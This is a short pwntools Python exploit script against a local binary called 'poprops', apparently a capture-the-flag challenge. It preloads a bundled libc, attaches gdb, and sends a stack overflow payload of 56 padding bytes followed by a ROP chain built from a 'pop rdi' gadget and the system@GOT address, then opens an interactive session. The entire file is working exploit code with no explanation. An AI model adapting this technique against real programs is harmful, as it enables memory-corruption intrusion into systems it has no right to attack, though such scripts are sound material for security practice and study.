#!/usr/bin/env python

from pwn import *

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
r = process("./poprops", env=env)
gdb.attach(r, '''
	set disable-randomization off
	b *0x400604
	c
	''')

r.recvuntil("??\n")

payload = ''
payload += "stuff".ljust(56)
payload += p64(0x4005d5) # pop rdi
payload += p64(0x601018) # system@GOT
payload += p64(0x4005ee)

r.sendline(payload)


r.interactive()